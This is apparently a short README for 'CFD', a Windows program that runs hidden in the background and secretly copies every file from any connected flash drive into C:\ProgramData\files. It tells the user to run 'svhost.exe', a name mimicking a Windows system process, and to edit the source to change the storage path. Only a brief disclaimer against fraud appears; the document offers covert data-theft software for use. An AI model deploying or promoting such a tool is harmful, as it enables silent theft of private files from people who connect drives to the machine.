# CFD
CFD - Copy Flash Drive. This program runs in the background and secretly copies all files from connected flash drives. 

Unpack this archive, go to dist and run svhost.exe. Before use, I recommend turning off the Quick Access Toolbar. All files from flash drives are saved to this path: C:\\ProgramData\\files. You can edit the source code and compile into exe to change the path, check time and so on.


Please do not use this program for fraud, etc.
